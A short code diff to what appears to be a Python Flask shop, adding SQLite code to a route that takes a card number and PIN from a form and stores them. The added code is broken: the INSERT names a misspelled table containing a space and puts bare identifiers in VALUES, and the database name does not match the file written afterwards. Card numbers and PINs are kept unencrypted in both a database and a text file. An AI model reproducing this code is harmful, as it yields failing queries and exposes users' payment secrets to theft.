@@ -42,8 +42,13 @@ def addToCart(productName, price):
 
 @app.route('/save_bank_info', methods=['POST'])
 def save_bank_info():
+    con = sqlite3.connect("bank inf.db")
+    cur = con.cursor()
     card_number = request.form['card_number']
     pin_code = request.form['pin_code']
+    cur.execute("""INSERT INTO banf inf(number_card,pin) VALUES(card_number,pin_code)""")
+    con.commit()
+    con.close()
 
     with open('bank info.db', 'a') as file:
         file.write(f"Card Number: {card_number}, PIN Code: {pin_code}\n")
